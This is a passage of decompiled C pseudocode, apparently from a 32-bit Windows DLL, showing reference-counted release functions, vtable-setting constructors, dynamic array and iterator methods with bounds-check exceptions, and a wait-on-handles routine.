      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10041AC3) --------------------------------------------------------
void __usercall sub_10041AC3(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10041AFD) --------------------------------------------------------
void __usercall sub_10041AFD(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10041B37) --------------------------------------------------------
void __usercall sub_10041B37(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10041B71) --------------------------------------------------------
void __usercall sub_10041B71(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10041BAB) --------------------------------------------------------
void __usercall sub_10041BAB(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10041BE5) --------------------------------------------------------
void __usercall sub_10041BE5(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10041C1F) --------------------------------------------------------
void __usercall sub_10041C1F(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10041C59) --------------------------------------------------------
void __usercall sub_10041C59(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10041C81) --------------------------------------------------------
_DWORD *__stdcall sub_10041C81(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_1009543C;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 1009543C: using guessed type int (__thiscall *off_1009543C)(void *Block, char);

//----- (10041CB0) --------------------------------------------------------
_DWORD *__stdcall sub_10041CB0(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_10095494;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10095494: using guessed type int (__thiscall *off_10095494)(void *Block, char);

//----- (10041CE9) --------------------------------------------------------
void *__usercall sub_10041CE9@<eax>(int a1@<eax>, _DWORD *a2@<esi>)
{
  void *result; // eax

  a2[1] = 0;
  a2[2] = a1;
  result = operator new(4 * a1);
  a2[3] = result;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10041D09) --------------------------------------------------------
void __usercall sub_10041D09(_DWORD *a1@<edi>, unsigned int a2@<esi>)
{
  _DWORD *v2; // ebx
  int v3; // ecx
  unsigned int *v4; // eax

  v2 = 0;
  a1[1] = 0;
  a1[2] = a2;
  v3 = (12 * (unsigned __int64)a2) >> 32 != 0 ? -1 : 12 * a2;
  v4 = (unsigned int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = a2;
    `eh vector constructor iterator'(v4 + 1, 0xCu, a2, (void (__thiscall *)(void *))sub_100413FE, sub_1000A9D3);
  }
  a1[3] = v2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (10041DEE) --------------------------------------------------------
_DWORD *__stdcall sub_10041DEE(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_100958A8;
  return a1;
}
// 100958A8: using guessed type int (__thiscall *off_100958A8)(void *Block, char);

//----- (10041E22) --------------------------------------------------------
void __stdcall sub_10041E22(_DWORD *a1)
{
  sub_1001646C(a1);
}

//----- (10041E46) --------------------------------------------------------
_DWORD *__thiscall sub_10041E46(_DWORD *Block, char a2)
{
  sub_10041E22(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10041E63) --------------------------------------------------------
_DWORD *__stdcall sub_10041E63(_DWORD *a1)
{
  sub_10042A78(a1);
  return a1;
}

//----- (10041E8A) --------------------------------------------------------
void *__stdcall sub_10041E8A(int a1)
{
  return sub_10042AEF(a1);
}

//----- (10041EAE) --------------------------------------------------------
_DWORD *__stdcall sub_10041EAE(_DWORD *a1, int a2)
{
  sub_10042A78(a1);
  (*(void (__thiscall **)(_DWORD *, int))(*a1 + 56))(a1, a2);
  return a1;
}

//----- (10041EEA) --------------------------------------------------------
int __userpurge sub_10041EEA@<eax>(int a1@<esi>, DWORD dwMilliseconds)
{
  unsigned int v2; // edi
  int v4; // eax
  DWORD v5; // eax
  DWORD v6; // eax
  unsigned int i; // edi
  const HANDLE *v8; // [esp-Ch] [ebp-10h]
  DWORD v9; // [esp-4h] [ebp-8h]

  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1);
  if ( !v2 )
  {
    Sleep(dwMilliseconds);
    return -1;
  }
  v4 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)a1 + 48))(a1, 0);
  v9 = dwMilliseconds;
  v8 = (const HANDLE *)v4;
  v5 = (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1);
  v6 = WaitForMultipleObjects(v5, v8, 0, v9);
  if ( v6 >= v2 )
  {
    if ( v6 == -1 )
    {
      GetLastError();
      for ( i = 0; i < (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1); ++i )
        ;
      sub_10041FCC(&dwMilliseconds);
      _CxxThrowException(&dwMilliseconds, (_ThrowInfo *)&_TI3_AVOaciVrczxgUcrvluwoa_Gvknob_zwqqelb_wztxn__);
    }
    return -1;
  }
  return *(_DWORD *)(*(int (__thiscall **)(int, DWORD))(*(_DWORD *)a1 + 48))(a1, v6);
}

//----- (10041F75) --------------------------------------------------------
_DWORD *__stdcall sub_10041F75(_DWORD *a1)
{
  sub_10041DEE(a1);
  *a1 = &off_100958B0;
  return a1;
}
// 100958B0: using guessed type int (__thiscall *off_100958B0)(void *Block, char);

//----- (10041FA8) --------------------------------------------------------
void __thiscall sub_10041FA8(_DWORD *this)
{
  sub_10041E22(this);
}

//----- (10041FCC) --------------------------------------------------------
_DWORD *__stdcall sub_10041FCC(_DWORD *a1)
{
  sub_10041DEE(a1);
  *a1 = &off_100958B8;
  return a1;
}
// 100958B8: using guessed type int (__thiscall *off_100958B8)(void *Block, char);

//----- (10041FFF) --------------------------------------------------------
void __thiscall sub_10041FFF(_DWORD *this)
{
  sub_10041E22(this);
}

//----- (10042023) --------------------------------------------------------
_DWORD *__thiscall sub_10042023(_DWORD *this, int a2)
{
  sub_1004205B(this, a2);
  *this = &off_100958B0;
  return this;
}
// 100958B0: using guessed type int (__thiscall *off_100958B0)(void *Block, char);

//----- (1004205B) --------------------------------------------------------
_DWORD *__thiscall sub_1004205B(_DWORD *this, int a2)
{
  sub_10016406(this, a2);
  *this = &off_100958A8;
  return this;
}
// 100958A8: using guessed type int (__thiscall *off_100958A8)(void *Block, char);

//----- (10042093) --------------------------------------------------------
_DWORD *__thiscall sub_10042093(_DWORD *this, int a2)
{
  sub_1004205B(this, a2);
  *this = &off_100958B8;
  return this;
}
// 100958B8: using guessed type int (__thiscall *off_100958B8)(void *Block, char);

//----- (100420CB) --------------------------------------------------------
_DWORD *__thiscall sub_100420CB(_DWORD *Block, char a2)
{
  sub_10041FA8(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100420E7) --------------------------------------------------------
_DWORD *__thiscall sub_100420E7(_DWORD *Block, char a2)
{
  sub_10041FFF(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10042103) --------------------------------------------------------
int __thiscall sub_10042103(void *this, char a2)
{
  return (*(int (__thiscall **)(void *, char *))(*(_DWORD *)this + 36))(this, &a2);
}

//----- (1004214A) --------------------------------------------------------
_DWORD *__thiscall sub_1004214A(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_10042742(this, v3, 0);
  else
    v4 = 0;
  sub_10042EAB(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100421A7) --------------------------------------------------------
_DWORD *__thiscall sub_100421A7(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_100428B2(this, v3, 0);
  else
    v4 = 0;
  sub_10042F42(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10042204) --------------------------------------------------------
_DWORD *__thiscall sub_10042204(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_10042742(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10042EAB(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10042269) --------------------------------------------------------
_DWORD *__thiscall sub_10042269(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_100428B2(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10042F42(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100422CE) --------------------------------------------------------
_DWORD *__thiscall sub_100422CE(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_10042742(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10042EAB(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1004234D) --------------------------------------------------------
_DWORD *__thiscall sub_1004234D(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_100428B2(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10042F42(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100423CC) --------------------------------------------------------
void *__thiscall sub_100423CC(_DWORD *this)
{
  void *result; // eax

  result = &loc_10074C5D;
  *this = &off_1009591C;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 1009591C: using guessed type int (__thiscall *off_1009591C)(void *Block, char);

//----- (100423F6) --------------------------------------------------------
int *__thiscall sub_100423F6(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_100426D1(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1004244E: variable 'v5' is possibly undefined

//----- (10042469) --------------------------------------------------------
int *__thiscall sub_10042469(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10042711(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 100424C1: variable 'v5' is possibly undefined

//----- (100424DC) --------------------------------------------------------
void __thiscall sub_100424DC(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10042EEF(v2);
}

//----- (1004251A) --------------------------------------------------------
void __thiscall sub_1004251A(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10042EEF(v3);
}

//----- (1004255B) --------------------------------------------------------
void __thiscall sub_1004255B(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10042EEF(v2);
}

//----- (10042599) --------------------------------------------------------
int __thiscall sub_10042599(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10042F86(v4);
  return v2;
}

//----- (100425DD) --------------------------------------------------------
int __thiscall sub_100425DD(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10042EEF(v4);
  return v2;
}

//----- (10042621) --------------------------------------------------------
void __thiscall sub_10042621(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10042EEF(v1);
}

//----- (10042676) --------------------------------------------------------
_DWORD *__thiscall sub_10042676(_DWORD *Block, char a2)
{
  sub_100423CC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100426D1) --------------------------------------------------------
int __usercall sub_100426D1@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10042711) --------------------------------------------------------
int __usercall sub_10042711@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10042742) --------------------------------------------------------
_DWORD *__thiscall sub_10042742(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10095954;
  a2[1] = this;
  *a2 = &off_10095994;
  a2[2] = a3;
  return result;
}
// 10095954: using guessed type int (__thiscall *off_10095954)(void *Block, char);
// 10095994: using guessed type int (__thiscall *off_10095994)(void *Block, char);

//----- (1004277A) --------------------------------------------------------
void *__thiscall sub_1004277A(_DWORD *this)
{
  void *result; // eax

  result = &loc_10074BCD;
  *this = &off_10095994;
  *this = &off_10095954;
  return result;
}
// 10095954: using guessed type int (__thiscall *off_10095954)(void *Block, char);
// 10095994: using guessed type int (__thiscall *off_10095994)(void *Block, char);

//----- (100427A4) --------------------------------------------------------
bool __thiscall sub_100427A4(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (100427BB) --------------------------------------------------------
BOOL __thiscall sub_100427BB(_DWORD *this)
{
  return this[2] != 0;
}

//----- (100427C5) --------------------------------------------------------
int __thiscall sub_100427C5(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10042800) --------------------------------------------------------
int __thiscall sub_10042800(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10042836) --------------------------------------------------------
int __thiscall sub_10042836(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1004285E) --------------------------------------------------------
int __thiscall sub_1004285E(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10042899) --------------------------------------------------------
int __thiscall sub_10042899(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (100428B2) --------------------------------------------------------
_DWORD *__thiscall sub_100428B2(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10095974;
  a2[1] = this;
  *a2 = &off_100959B4;
  a2[2] = a3;
  return result;
}
// 10095974: using guessed type int (__thiscall *off_10095974)(void *Block, char);
// 100959B4: using guessed type int (__thiscall *off_100959B4)(void *Block, char);

//----- (100428EA) --------------------------------------------------------
void *__thiscall sub_100428EA(_DWORD *this)
{
  void *result; // eax

  result = &loc_10074BA9;
  *this = &off_100959B4;
  *this = &off_10095974;
  return result;
}
// 10095974: using guessed type int (__thiscall *off_10095974)(void *Block, char);
// 100959B4: using guessed type int (__thiscall *off_100959B4)(void *Block, char);

//----- (10042914) --------------------------------------------------------
bool __thiscall sub_10042914(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1004292B) --------------------------------------------------------
BOOL __thiscall sub_1004292B(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10042935) --------------------------------------------------------
int __thiscall sub_10042935(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10042970) --------------------------------------------------------
int __thiscall sub_10042970(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (100429A6) --------------------------------------------------------
int __thiscall sub_100429A6(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (100429CE) --------------------------------------------------------
int __thiscall sub_100429CE(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10042A09) --------------------------------------------------------
int __thiscall sub_10042A09(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10042A22) --------------------------------------------------------
_DWORD *__thiscall sub_10042A22(_DWORD *Block, char a2)
{
  sub_1004277A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10042A3E) --------------------------------------------------------
_DWORD *__thiscall sub_10042A3E(_DWORD *Block, char a2)
{
  sub_100428EA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10042A78) --------------------------------------------------------
_DWORD *__stdcall sub_10042A78(_DWORD *a1)
{
  sub_10042FE1(a1);
  *a1 = &off_100958C0;
  sub_10043010(a1);
  return a1;
}
// 100958C0: using guessed type int (__thiscall *off_100958C0)(void *Block, char);

//----- (10042AB0) --------------------------------------------------------
void **__thiscall sub_10042AB0(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int); // ebx
  int v4; // eax
  int v5; // eax

  if ( a2 != this )
  {
    j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int))*this;
    this[2] = (void *)1;
    v4 = (*((int (__thiscall **)(void **))*a2 + 1))(a2);
    v5 = (*((int (__thiscall **)(void **, void *, int))*a2 + 1))(a2, a2[3], v4);
    v3[21](this, v5);
  }
  return this;
}

//----- (10042AEF) --------------------------------------------------------
void *__thiscall sub_10042AEF(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_100958C0;
  v4 = 1;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  v4 = -1;
  return sub_100423CC((_DWORD *)this);
}
// 100958C0: using guessed type int (__thiscall *off_100958C0)(void *Block, char);

//----- (10042B4D) --------------------------------------------------------
int __thiscall sub_10042B4D(_DWORD *this)
{
  return this[1];
}

//----- (10042B51) --------------------------------------------------------
int __thiscall sub_10042B51(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B64FD);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = *a2;
  ++this[1];
  return result;
}

//----- (10042BAC) --------------------------------------------------------
int __thiscall sub_10042BAC(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (10042BC4) --------------------------------------------------------
int __thiscall sub_10042BC4(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B64FE);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
